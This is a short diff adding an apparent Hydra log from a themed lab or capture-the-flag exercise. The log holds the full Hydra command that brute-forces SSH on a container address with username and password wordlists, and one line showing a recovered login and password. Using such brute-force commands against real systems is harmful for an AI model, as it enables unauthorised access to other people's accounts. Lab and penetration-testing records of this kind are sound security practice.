@@ -1,0 +1,2 @@
+# Hydra v9.7 run at 2026-10-21 09:38:29 on 172.17.0.2 ssh (hydra -L wordlists/arasaka_users.txt -P wordlists/arasaka_passwords.txt -t 4 -I -o loot/hydra-ssh.txt ssh://172.17.0.2)
+[22][ssh] host: 172.17.0.2   login: netrunner   password: netrunner2077
